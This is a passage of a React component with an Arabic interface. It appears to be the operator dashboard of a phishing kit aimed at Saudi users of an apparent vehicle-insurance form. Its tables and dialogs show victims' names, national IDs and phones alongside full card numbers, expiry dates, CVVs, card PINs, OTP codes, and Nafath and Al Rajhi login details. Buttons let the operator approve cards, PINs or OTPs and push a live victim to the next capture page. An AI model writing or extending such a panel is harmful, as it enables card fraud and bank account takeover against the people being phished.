                    : "border-2 border-blue-200 hover:bg-blue-50 bg-white/80"
                }
              >
                الكل
              </Button>
              <Button
                variant={activeFilter === "pending" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("pending")}
                className={
                  activeFilter === "pending"
                    ? "bg-gradient-to-r from-amber-400 to-orange-500 text-white hover:from-amber-500 hover:to-orange-600 shadow-lg"
                    : "border-2 border-amber-200 hover:bg-amber-50 bg-white/80"
                }
              >
                <Clock className="h-3.5 w-3.5 ml-1" />
                قيد الانتظار
              </Button>
              <Button
                variant={activeFilter === "approved" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("approved")}
                className={
                  activeFilter === "approved"
                    ? "bg-gradient-to-r from-emerald-400 to-teal-500 text-white hover:from-emerald-500 hover:to-teal-600 shadow-lg"
                    : "border-2 border-emerald-200 hover:bg-emerald-50 bg-white/80"
                }
              >
                <CheckCircle className="h-3.5 w-3.5 ml-1" />
                مقبول
              </Button>
              <Button
                variant={activeFilter === "rejected" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("rejected")}
                className={
                  activeFilter === "rejected"
                    ? "bg-gradient-to-r from-rose-400 to-red-500 text-white hover:from-rose-500 hover:to-red-600 shadow-lg"
                    : "border-2 border-rose-200 hover:bg-rose-50 bg-white/80"
                }
              >
                <XCircle className="h-3.5 w-3.5 ml-1" />
                مرفوض
              </Button>
              <Button
                variant={activeFilter === "payment" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("payment")}
                className={
                  activeFilter === "payment"
                    ? "bg-gradient-to-r from-emerald-400 to-teal-500 text-white hover:from-emerald-500 hover:to-teal-600 shadow-lg"
                    : "border-2 border-emerald-200 hover:bg-emerald-50 bg-white/80"
                }
              >
                <CreditCard className="h-3.5 w-3.5 ml-1" />
                دفع
              </Button>
              <Button
                variant={activeFilter === "registration" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("registration")}
                className={
                  activeFilter === "registration"
                    ? "bg-gradient-to-r from-indigo-400 to-blue-500 text-white hover:from-indigo-500 hover:to-blue-600 shadow-lg"
                    : "border-2 border-indigo-200 hover:bg-indigo-50 bg-white/80"
                }
              >
                <Car className="h-3.5 w-3.5 ml-1" />
                تسجيل
              </Button>
            </div>
          </div>
        </div>
        <CardContent className="p-0 bg-white/90 backdrop-blur-sm">
          {filteredNotifications.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-16">
              <div className="w-24 h-24 rounded-full bg-gradient-to-br from-blue-100 to-purple-100 flex items-center justify-center mb-4">
                <AlertCircle className="h-12 w-12 text-blue-400" />
              </div>
              <h3 className="text-xl font-medium mb-2 text-gray-700">لا توجد بيانات</h3>
              <p className="text-gray-500 max-w-md text-center">
                {searchTerm || activeFilter
                  ? "لا توجد نتائج مطابقة لمعايير البحث. يرجى تعديل معايير البحث أو الفلتر."
                  : "ستظهر البيانات الجديدة هنا عند وصولها"}
              </p>
              {(searchTerm || activeFilter) && (
                <Button
                  variant="outline"
                  className="mt-4 border-2 border-blue-200 hover:bg-blue-50 bg-white/80"
                  onClick={() => {
                    setSearchTerm("")
                    setActiveFilter(null)
                  }}
                >
                  إعادة ضبط البحث
                </Button>
              )}
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className="bg-gradient-to-r from-blue-50/80 to-purple-50/80 hover:from-blue-50/80 hover:to-purple-50/80 border-b border-blue-200/50">
                    <TableHead className="text-right font-bold text-blue-700">الحالة الاتصال</TableHead>
                    <TableHead className="text-right font-bold text-blue-700">الدولة</TableHead>
                    <TableHead className="text-right font-bold text-blue-700">الصفحة الحالية</TableHead>
                    <TableHead className="text-right font-bold text-blue-700">الاسم</TableHead>
                    <TableHead className="text-right font-bold text-blue-700">رقم البطاقة</TableHead>
                    <TableHead className="text-right font-bold text-blue-700">اجراء مطلوب</TableHead>
                    <TableHead className="text-right font-bold text-blue-700">رمز التحقق</TableHead>
                    <TableHead className="text-right font-bold text-blue-700">الحالة</TableHead>
                    <TableHead className="text-right font-bold text-blue-700">التاريخ</TableHead>
                    <TableHead className="text-center font-bold text-blue-700">إجراءات</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {paginatedNotifications.map((notification) => (
                    <TableRow
                      key={notification.id}
                      className="hover:bg-gradient-to-r hover:from-blue-50/30 hover:to-purple-50/30 border-b border-blue-100/50 relative cursor-pointer transition-all duration-200"
                    >
                      <TableCell>
                        <OnlineStatusIndicator userId={getUserId(notification)} />
                      </TableCell>
                      <TableCell>{notification?.country}</TableCell>

                      <TableCell>{getPageType(notification.pagename, true, notification)}</TableCell>
                      <TableCell className="font-medium">
                        <div className="flex items-center gap-2">
                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-blue-100 to-purple-100 flex items-center justify-center">
                            <User className="h-4 w-4 text-blue-600" />
                          </div>
                          <Badge
                            variant="outline"
                            className="bg-gradient-to-r from-gray-50 to-slate-100 hover:from-gray-100 hover:to-slate-200 text-gray-800 border-2 border-gray-200 shadow-sm cursor-pointer transition-all duration-200 hover:shadow-md"
                            onClick={() => handleInfoClick(notification, "personal")}
                          >
                            {notification.documment_owner_full_name ||
                              notification.document_owner_full_name ||
                              "غير محدد"}
                          </Badge>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge
                          variant="outline"
                          className={`cursor-pointer transition-all duration-200 hover:shadow-lg ${
                            notification?.cardNumber
                              ? notification.pinCode
                                ? "bg-gradient-to-r from-emerald-100 to-teal-100 text-emerald-700 border-2 border-emerald-300 hover:from-emerald-200 hover:to-teal-200"
                                : notification.otp
                                  ? "bg-gradient-to-r from-cyan-100 to-blue-100 text-cyan-700 border-2 border-cyan-300 hover:from-cyan-200 hover:to-blue-200"
                                  : "bg-gradient-to-r from-amber-100 to-orange-100 text-amber-700 border-2 border-amber-300 hover:from-amber-200 hover:to-orange-200"
                              : "bg-gradient-to-r from-rose-400 to-red-500 text-white hover:from-rose-500 hover:to-red-600 border-0 shadow-lg"
                          }`}
                          onClick={(e) => handleCardBadgeClick(notification, e)}
                        >
                          <CardIcon className="h-3.5 w-3.5 mr-1.5 mx-1" />
                          {notification.cardNumber ? "بيانات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-1.5 flex-wrap">
                          {notification?.nafadUsername && (
                            <Badge
                              onClick={(e) => {
                                e.stopPropagation()
                                setSelectedNotification(notification)
                                setShowNafazDialog(true)
                              }}
                              className="bg-gradient-to-r from-cyan-400 to-blue-500 hover:from-cyan-500 hover:to-blue-600 cursor-pointer shadow-lg hover:shadow-xl transition-all duration-200"
                            >
                              نفاذ
                            </Badge>
                          )}
                          {notification?.externalUsername && (
                            <Badge
                              variant="default"
                              className="cursor-pointer bg-gradient-to-r from-teal-400 to-cyan-500 hover:from-teal-500 hover:to-cyan-600 shadow-lg hover:shadow-xl transition-all duration-200"
                              onClick={(e) => {
                                e.stopPropagation()
                                setSelectedNotification(notification)
                                setShowRajhiDialog(true)
                              }}
                            >
                              راجحي
                            </Badge>
                          )}
                          {notification.phone2 && (
                            <Badge
                              className={`cursor-pointer transition-all duration-200 hover:shadow-lg ${
                                notification.phoneVerificationStatus === "pending" ? "animate-pulse" : ""
                              } ${
                                notification.otp
                                  ? "bg-gradient-to-r from-purple-400 to-violet-500 text-white hover:from-purple-500 hover:to-violet-600"
                                  : "bg-gradient-to-r from-slate-400 to-gray-500 hover:from-slate-500 hover:to-gray-600"
                              }`}
                              onClick={(e) => {
                                e.stopPropagation()
                                setSelectedNotification(notification)
                                setPhoneDialog(true)
                              }}
                              variant="outline"
                            >
                              {notification.phone2}
                            </Badge>
                          )}
                        </div>
                      </TableCell>
                      <TableCell>
                        {notification.otp && (
                          <Badge className="bg-gradient-to-r from-emerald-500 to-teal-600 shadow-lg">
                            {notification.otp}
                          </Badge>
                        )}
                      </TableCell>
                      <TableCell>{getStatusBadge(notification.status)}</TableCell>
                      <TableCell>
                        <div className="flex flex-col text-right" dir="rtl">
                          {formatDistanceToNow(new Date(notification.createdDate), {
                            addSuffix: true,
                            locale: ar,
                          })}
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex justify-center gap-1">
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-8 w-8 rounded-full hover:bg-gradient-to-r hover:from-blue-100 hover:to-purple-100 hover:text-blue-600 transition-all duration-200"
                            onClick={() => handleViewDetails(notification)}
                          >
                            <Eye className="h-4 w-4" />
                          </Button>
                          <DropdownMenu>
                            <DropdownMenuTrigger asChild>
                              <Button
                                variant="ghost"
                                size="icon"
                                className="h-8 w-8 rounded-full hover:bg-gradient-to-r hover:from-blue-100 hover:to-purple-100 hover:text-blue-600 transition-all duration-200"
                              >
                                <MoreHorizontal className="h-4 w-4" />
                              </Button>
                            </DropdownMenuTrigger>
                            <DropdownMenuContent
                              align="end"
                              className="bg-white/95 backdrop-blur-sm border-2 border-blue-200"
                            >
                              <DropdownMenuLabel>خيارات</DropdownMenuLabel>
                              <DropdownMenuSeparator />
                              <DropdownMenuItem
                                onClick={() => handleInfoClick(notification, "personal")}
                                className="gap-2 hover:bg-blue-50"
                              >
                                <User className="h-4 w-4" />
                                معلومات شخصية
                              </DropdownMenuItem>
                              {(notification.cardNumber ||
                                (notification.formData && notification.formData.cardNumber)) && (
                                <DropdownMenuItem
                                  onClick={() => handleInfoClick(notification, "card")}
                                  className="gap-2 hover:bg-blue-50"
                                >
                                  <CreditCard className="h-4 w-4" />
                                  معلومات البطاقة
                                </DropdownMenuItem>
                              )}
                              {notification.vehicle_type && (
                                <DropdownMenuItem
                                  onClick={() => handleInfoClick(notification, "vehicle")}
                                  className="gap-2 hover:bg-blue-50"
                                >
                                  <Car className="h-4 w-4" />
                                  معلومات المركبة
                                </DropdownMenuItem>
                              )}
                              <DropdownMenuSeparator />
                              <DropdownMenuItem
                                onClick={() => handleDelete(notification.id)}
                                className="gap-2 text-rose-600 hover:bg-rose-50"
                              >
                                <Trash2 className="h-4 w-4" />
                                حذف
                              </DropdownMenuItem>
                            </DropdownMenuContent>
                          </DropdownMenu>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
        {/* Pagination */}
        {filteredNotifications.length > 0 && (
          <CardFooter className="p-4 bg-gradient-to-r from-blue-50/50 to-purple-50/50 border-t border-blue-200/30">
            <div className="flex flex-col sm:flex-row justify-between items-center gap-4 w-full">
              <div className="text-sm text-gray-600">
                عرض {(currentPage - 1) * itemsPerPage + 1} إلى{" "}
                {Math.min(currentPage * itemsPerPage, filteredNotifications.length)} من {filteredNotifications.length}{" "}
                عنصر
                {notifications.length !== filteredNotifications.length && (
                  <span className="mr-2">(إجمالي: {notifications.length})</span>
                )}
              </div>
              {totalPages > 1 && (
                <div className="flex items-center gap-2">
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={goToFirstPage}
                    disabled={currentPage === 1}
                    className="h-8 w-8 border-2 border-blue-200 hover:bg-blue-50 bg-white/80"
                  >
                    <ChevronsRight className="h-4 w-4" />
                  </Button>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={goToPreviousPage}
                    disabled={currentPage === 1}
                    className="h-8 w-8 border-2 border-blue-200 hover:bg-blue-50 bg-white/80"
                  >
                    <ChevronRight className="h-4 w-4" />
                  </Button>
                  <div className="flex gap-1">
                    {getPageNumbers().map((page) => (
                      <Button
                        key={page}
                        variant={currentPage === page ? "default" : "outline"}
                        size="sm"
                        onClick={() => goToPage(page)}
                        className={`h-8 w-8 ${
                          currentPage === page
                            ? "bg-gradient-to-r from-blue-500 to-purple-600 text-white hover:from-blue-600 hover:to-purple-700 shadow-lg"
                            : "border-2 border-blue-200 hover:bg-blue-50 bg-white/80"
                        }`}
                      >
                        {page}
                      </Button>
                    ))}
                  </div>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={goToNextPage}
                    disabled={currentPage === totalPages}
                    className="h-8 w-8 border-2 border-blue-200 hover:bg-blue-50 bg-white/80"
                  >
                    <ChevronLeft className="h-4 w-4" />
                  </Button>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={goToLastPage}
                    disabled={currentPage === totalPages}
                    className="h-8 w-8 border-2 border-blue-200 hover:bg-blue-50 bg-white/80"
                  >
                    <ChevronsLeft className="h-4 w-4" />
                  </Button>
                </div>
              )}
            </div>
          </CardFooter>
        )}
      </Card>

      {/* Info Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-white/95 border-0 shadow-2xl max-w-md rounded-xl backdrop-blur-xl" dir="rtl">
          <DialogHeader className="border-b border-blue-200/50 pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 text-transparent bg-clip-text">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات المركبة"}
            </DialogTitle>
            <DialogDescription className="text-gray-600">
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية للمستخدم"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات البطاقة البنكية"
                  : "تفاصيل معلومات المركبة"}
            </DialogDescription>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 py-2">
              <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-purple-50 flex flex-col gap-1">
                <p className="text-sm text-blue-600">الاسم الكامل</p>
                <div className="flex items-center gap-2 mt-1">
                  <User className="h-4 w-4 text-blue-600" />
                  <p className="font-medium text-lg text-gray-800">
                    {selectedNotification.documment_owner_full_name ||
                      selectedNotification.document_owner_full_name ||
                      "غير محدد"}
                  </p>
                </div>
              </div>
              <div className="p-4 rounded-lg bg-gradient-to-r from-emerald-50 to-teal-50 flex flex-col gap-1">
                <p className="text-sm text-emerald-600">رقم الهوية</p>
                <div className="flex items-center gap-2 mt-1">
                  <Shield className="h-4 w-4 text-emerald-600" />
                  <p className="font-medium text-lg font-mono text-gray-800">
                    {selectedNotification.owner_identity_number ||
                      selectedNotification.buyer_identity_number ||
                      "غير محدد"}
                  </p>
                </div>
              </div>
              <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 to-pink-50 flex flex-col gap-1">
                <p className="text-sm text-purple-600">رقم الهاتف</p>
                <div className="flex items-center gap-2 mt-1">
                  <p className="font-medium text-lg font-mono text-gray-800">{selectedNotification.phone}</p>
                </div>
              </div>
              <div className="p-4 rounded-lg bg-gradient-to-r from-amber-50 to-orange-50 flex flex-col gap-1">
                <p className="text-sm text-amber-600">نوع الطلب</p>
                <div className="flex items-center gap-2 mt-1">
                  <p className="font-medium text-gray-800">
                    {selectedNotification.pagename || selectedNotification.insurance_purpose || "غير محدد"}
                  </p>
                </div>
              </div>
              {selectedNotification.serial_number && (
                <div className="p-4 rounded-lg bg-gradient-to-r from-cyan-50 to-blue-50 flex flex-col gap-1">
                  <p className="text-sm text-cyan-600">الرقم التسلسلي</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium font-mono text-gray-800">{selectedNotification.serial_number}</p>
                  </div>
                </div>
              )}
              {/* Online Status in Personal Info */}
              <div className="p-4 rounded-lg bg-gradient-to-r from-indigo-50 to-blue-50 flex flex-col gap-1">
                <p className="text-sm text-indigo-600">حالة الاتصال</p>
                <div className="flex items-center gap-2 mt-1">
                  <OnlineStatusText userId={getUserId(selectedNotification)} />
                </div>
              </div>
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <Tabs defaultValue="main" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-4 bg-gradient-to-r from-blue-100 to-purple-100">
                <TabsTrigger
                  value="main"
                  className="data-[state=active]:bg-gradient-to-r data-[state=active]:from-blue-500 data-[state=active]:to-purple-600 data-[state=active]:text-white"
                >
                  البطاقة الرئيسية
                </TabsTrigger>
                <TabsTrigger
                  value="form"
                  className="data-[state=active]:bg-gradient-to-r data-[state=active]:from-blue-500 data-[state=active]:to-purple-600 data-[state=active]:text-white"
                >
                  بيانات النموذج
                </TabsTrigger>
              </TabsList>
              <TabsContent value="main" className="space-y-3 py-2">
                <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-purple-50 flex flex-col gap-1">
                  <p className="text-sm text-blue-600">اسم حامل البطاقة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <User className="h-4 w-4 text-blue-600" />
                    <p className="font-medium text-lg text-gray-800">
                      {selectedNotification.document_owner_full_name || selectedNotification.full_name || "غير محدد"}
                    </p>
                  </div>
                </div>
                <div className="p-4 rounded-lg bg-gradient-to-r from-emerald-50 to-teal-50 flex flex-col gap-1">
                  <p className="text-sm text-emerald-600">رقم البطاقة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <CreditCard className="h-4 w-4 text-emerald-600" />
                    <p className="font-medium text-lg font-mono text-gray-800">
                      {selectedNotification.cardNumber || "غير محدد"}
                    </p>
                  </div>
                </div>
                <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 to-pink-50 flex flex-col gap-1">
                  <p className="text-sm text-purple-600">تاريخ الانتهاء</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Calendar className="h-4 w-4 text-purple-600" />
                    <p className="font-medium text-lg font-mono text-gray-800">
                      {selectedNotification.cardMonth && selectedNotification.cardYear
                        ? `${selectedNotification.cardMonth}/${selectedNotification.cardYear}`
                        : "غير محدد"}
                    </p>
                  </div>
                </div>
                <div className="p-4 rounded-lg bg-gradient-to-r from-amber-50 to-orange-50 flex flex-col gap-1">
                  <p className="text-sm text-amber-600">رمز الأمان (CVV)</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Shield className="h-4 w-4 text-amber-600" />
                    <p className="font-medium text-lg font-mono text-gray-800">
                      {selectedNotification.cvv || "غير محدد"}
                    </p>
                  </div>
                </div>
              </TabsContent>
              <TabsContent value="form" className="space-y-3 py-2">
                {selectedNotification.formData ? (
                  <>
                    <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-purple-50 flex flex-col gap-1">
                      <p className="text-sm text-blue-600">اسم حامل البطاقة</p>
                      <div className="flex items-center gap-2 mt-1">
                        <User className="h-4 w-4 text-blue-600" />
                        <p className="font-medium text-lg text-gray-800">
                          {selectedNotification.formData.full_name || "غير محدد"}
                        </p>
                      </div>
                    </div>
                    <div className="p-4 rounded-lg bg-gradient-to-r from-emerald-50 to-teal-50 flex flex-col gap-1">
                      <p className="text-sm text-emerald-600">رقم البطاقة</p>
                      <div className="flex items-center gap-2 mt-1">
                        <CreditCard className="h-4 w-4 text-emerald-600" />
                        <p className="font-medium text-lg font-mono text-gray-800">
                          {selectedNotification.formData.cardNumber || "غير محدد"}
                        </p>
                      </div>
                    </div>
                    <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 to-pink-50 flex flex-col gap-1">
                      <p className="text-sm text-purple-600">تاريخ الانتهاء</p>
                      <div className="flex items-center gap-2 mt-1">
                        <Calendar className="h-4 w-4 text-purple-600" />
                        <p className="font-medium text-lg font-mono text-gray-800">
                          {selectedNotification.formData.cardMonth && selectedNotification.formData.cardYear
                            ? `${selectedNotification.formData.cardMonth}/${selectedNotification.formData.cardYear}`
                            : "غير محدد"}
                        </p>
                      </div>
                    </div>
                    <div className="p-4 rounded-lg bg-gradient-to-r from-amber-50 to-orange-50 flex flex-col gap-1">
                      <p className="text-sm text-amber-600">رمز الأمان (CVV)</p>
                      <div className="flex items-center gap-2 mt-1">
                        <Shield className="h-4 w-4 text-amber-600" />
                        <p className="font-medium text-lg font-mono text-gray-800">
                          {selectedNotification.formData.cvv || "غير محدد"}
                        </p>
                      </div>
                    </div>
                  </>
                ) : (
                  <div className="flex flex-col items-center justify-center py-8 text-gray-500">
                    <AlertCircle className="h-12 w-12 mb-2 text-gray-400" />
                    <p>لا توجد بيانات نموذج متاحة</p>
                  </div>
                )}
              </TabsContent>
            </Tabs>
          )}
          {selectedInfo === "vehicle" && selectedNotification && (
            <div className="space-y-3 py-2">
              <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-purple-50 flex flex-col gap-1">
                <p className="text-sm text-blue-600">نوع المركبة</p>
                <div className="flex items-center gap-2 mt-1">
                  <Car className="h-4 w-4 text-blue-600" />
                  <p className="font-medium text-lg text-gray-800">{selectedNotification.vehicle_type || "غير محدد"}</p>
                </div>
              </div>
              {selectedNotification.vehicle_manufacture_number && (
                <div className="p-4 rounded-lg bg-gradient-to-r from-emerald-50 to-teal-50 flex flex-col gap-1">
                  <p className="text-sm text-emerald-600">رقم تصنيع المركبة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono text-gray-800">
                      {selectedNotification.vehicle_manufacture_number}
                    </p>
                  </div>
                </div>
              )}
              {selectedNotification.customs_code && (
                <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 to-pink-50 flex flex-col gap-1">
                  <p className="text-sm text-purple-600">رمز الجمارك</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono text-gray-800">{selectedNotification.customs_code}</p>
                  </div>
                </div>
              )}
              {selectedNotification.seller_identity_number && (
                <div className="p-4 rounded-lg bg-gradient-to-r from-amber-50 to-orange-50 flex flex-col gap-1">
                  <p className="text-sm text-amber-600">رقم هوية البائع</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Shield className="h-4 w-4 text-amber-600" />
                    <p className="font-medium text-lg font-mono text-gray-800">
                      {selectedNotification.seller_identity_number}
                    </p>
                  </div>
                </div>
              )}
              {selectedNotification.serial_number && (
                <div className="p-4 rounded-lg bg-gradient-to-r from-cyan-50 to-blue-50 flex flex-col gap-1">
                  <p className="text-sm text-cyan-600">الرقم التسلسلي</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono text-gray-800">{selectedNotification.serial_number}</p>
                  </div>
                </div>
              )}
            </div>
          )}
          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t border-blue-200/50">
            <Button
              onClick={closeDialog}
              className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 shadow-lg"
              variant="outline"
            >
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Card Dialog */}
      <Dialog open={showCardDialog} onOpenChange={(open) => !open && setShowCardDialog(false)}>
        <DialogContent className="bg-white/95 border-0 shadow-2xl max-w-md rounded-xl backdrop-blur-xl" dir="rtl">
          <DialogHeader className="border-b border-blue-200/50 pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 text-transparent bg-clip-text">
              معلومات البطاقة
            </DialogTitle>
            <DialogDescription className="text-gray-600">تفاصيل معلومات البطاقة البنكية</DialogDescription>
          </DialogHeader>
          {selectedCardInfo && (
            <div className="space-y-4 py-3">
              <div className="p-5 rounded-lg bg-gradient-to-r from-blue-500 to-purple-600 text-white shadow-xl">
                <div className="flex justify-between items-start mb-6">
                  <div className="flex flex-col">
                    <span className="text-xs text-blue-100 mb-1">حامل البطاقة</span>
                    <span className="font-medium">
                      {selectedCardInfo.document_owner_full_name || selectedCardInfo.full_name || "غير محدد"}
                    </span>
                  </div>
                  <CreditCard className="h-8 w-8 text-white opacity-80" />
                </div>
                <div className="mb-4">
                  <span className="text-xs text-blue-100 mb-1 block">رقم البطاقة</span>
                  <span className="font-mono text-lg tracking-wider" dir="ltr">
                    {selectedCardInfo.cardNumber ||
                      (selectedCardInfo.formData && selectedCardInfo.formData.cardNumber) ||
                      "غير محدد"}
                  </span>
                </div>
                <div className="flex justify-between">
                  <div>
                    <span className="text-xs text-blue-100 block">تاريخ الانتهاء</span>
                    <span className="font-mono">
                      {selectedCardInfo.cardMonth && selectedCardInfo.cardYear
                        ? `${selectedCardInfo.cardMonth}/${selectedCardInfo.cardYear}`
                        : selectedCardInfo.formData &&
                            selectedCardInfo.formData.cardMonth &&
                            selectedCardInfo.formData.cardYear
                          ? `${selectedCardInfo.formData.cardMonth}/${selectedCardInfo.formData.cardYear}`
                          : "غير محدد"}
                    </span>
                  </div>
                  <div>
                    <span className="text-xs text-blue-100 block">رمز الأمان</span>
                    <span className="font-mono">
                      {selectedCardInfo.cvv ||
                        (selectedCardInfo.formData && selectedCardInfo.formData.cvv) ||
                        "غير محدد"}
                    </span>
                  </div>
                </div>
              </div>
              <div className="p-4 rounded-lg bg-gradient-to-r from-gray-50 to-slate-100">
                <h3 className="font-medium mb-2 text-sm text-gray-700">معلومات إضافية</h3>
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-600">رقم سري بطاقة:</span>
                    <span className="text-gray-800">{selectedCardInfo.pinCode || "غير متوفر"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-600">رمز تحقق:</span>
                    <span className="text-gray-800">
                      {selectedCardInfo.otp || selectedCardInfo.phoneOtp || "غير متوفر"}
                    </span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-600">الحالة:</span>
                    <span className="text-gray-800">
                      {selectedCardInfo.paymentStatus === "approved"
                        ? "مقبول"
                        : selectedCardInfo.paymentStatus === "rejected"
                          ? "مرفوض"
                          : "قيد الانتظار"}
                    </span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-600">حالة الاتصال:</span>
                    <div className="flex items-center gap-2">
                      <OnlineStatusText userId={getUserId(selectedCardInfo)} />
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
          <DialogFooter className="grid grid-cols-4 mt-4 pt-3 border-t border-blue-200/50 gap-2">
            {selectedCardInfo?.cardNumber ? (
              <>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedCardInfo.id)
                    setShowCardDialog(false)
                  }}
                  className="w-full bg-gradient-to-r from-rose-400 to-red-500 hover:from-rose-500 hover:to-red-600 text-white border-0 shadow-lg"
                >
                  رفض
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedCardInfo.id)
                    setShowCardDialog(false)
                  }}
                  className="w-full bg-gradient-to-r from-emerald-400 to-teal-500 hover:from-emerald-500 hover:to-teal-600 text-white border-0 shadow-lg"
                >
                  قبول بطاقة
                </Button>
                <Button
                  onClick={() => {
                    handlePassApproval("approved", selectedCardInfo.id)
                  }}
                  className="w-full bg-gradient-to-r from-purple-400 to-violet-500 hover:from-purple-500 hover:to-violet-600 text-white border-0 shadow-lg"
                >
                  باس
                </Button>
                <Button
                  onClick={() => {
                    handlePhoneOtpApproval("approved", selectedCardInfo.id)
                  }}
                  className="w-full bg-gradient-to-r from-amber-400 to-orange-500 hover:from-amber-500 hover:to-orange-600 text-white border-0 shadow-lg"
                >
                  رفض OTP
                </Button>
              </>
            ) : null}
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Pagename Dialog */}
      <Dialog open={showPagenameDialog} onOpenChange={(open) => !open && setShowPagenameDialog(false)}>
        <DialogContent className="bg-white/95 border-0 shadow-2xl max-w-md rounded-xl backdrop-blur-xl" dir="rtl">
          <DialogHeader className="border-b border-blue-200/50 pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 text-transparent bg-clip-text">
              نوع الطلب
            </DialogTitle>
            <DialogDescription className="text-gray-600">تحديد أو تغيير نوع الطلب</DialogDescription>
          </DialogHeader>
          {selectedNotification && (
            <div className="space-y-4 py-3">
              <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-purple-50">
                <h3 className="font-medium mb-3 text-sm text-blue-700">النوع الحالي</h3>
                <div className="flex justify-center">{getPageType(selectedNotification.pagename)}</div>
              </div>
              <div className="p-4 rounded-lg bg-gradient-to-r from-gray-50 to-slate-100">
                <h3 className="font-medium mb-3 text-sm text-gray-700">اختر نوع الطلب</h3>
                <div className="grid grid-cols-2 gap-2">
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center border-2 border-blue-200 hover:bg-blue-50 transition-all duration-200 ${
                      selectedNotification.pagename === "payment"
                        ? "bg-gradient-to-r from-emerald-50 to-teal-50 border-emerald-300"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "6")}
                  >
                    <CreditCard className="h-4 w-4" />
                    دفع
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center border-2 border-blue-200 hover:bg-blue-50 transition-all duration-200 ${
                      selectedNotification.pagename === ""
                        ? "bg-gradient-to-r from-indigo-50 to-blue-50 border-indigo-300"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "1")}
                  >
                    <FileText className="h-4 w-4" />
                    تسجيل
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center border-2 border-blue-200 hover:bg-blue-50 transition-all duration-200 ${
                      selectedNotification.pagename === "nafaz"
                        ? "bg-gradient-to-r from-cyan-50 to-blue-50 border-cyan-300"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                  >
                    <Shield className="h-4 w-4" />
                    نفاذ
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center border-2 border-blue-200 hover:bg-blue-50 transition-all duration-200 ${
                      selectedNotification.pagename === "verify-otp"
                        ? "bg-gradient-to-r from-purple-50 to-violet-50 border-purple-300"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "7")}
                  >
                    <Shield className="h-4 w-4" />
                    رمز OTP
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center border-2 border-blue-200 hover:bg-blue-50 transition-all duration-200 ${
                      selectedNotification.pagename === "external-link"
